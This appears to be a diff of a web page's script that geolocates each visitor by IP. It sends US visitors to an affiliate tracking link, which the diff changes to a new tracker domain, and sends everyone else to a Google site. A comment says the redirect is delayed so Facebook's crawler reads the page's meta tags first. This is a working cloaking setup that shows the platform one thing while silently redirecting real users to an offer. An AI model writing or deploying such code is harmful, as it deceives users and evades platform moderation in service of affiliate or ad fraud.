@@ -32,25 +32,24 @@
   <script>
     async function redirectByCountry() {
       try {
-        // Free IP geolocation API
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
         const country = data.country; // Country code
 
         if (country === 'US') {
-          // USA visitor → Offer link
-          window.location.href = "https://www.af9m8trk.com/HEQ121Y7/L29128D9/?s1=mln69";
+          // USA visitor → NEW Offer link
+          window.location.href = "https://go2affm.com/c/?p=25125&o=23039&s1=Mn69n";
         } else {
           // Non-USA visitor → Another site
           window.location.href = "https://site.google.com";
         }
       } catch (err) {
-        // On error, default redirect to main site
+        // On error, default redirect
         window.location.href = "https://site.google.com";
       }
     }
 
-    // Delay 1.5s for FB crawler to read meta tags
+    // Delay for FB crawler to read meta tags
     setTimeout(redirectByCountry, 1500);
   </script>
 </head>
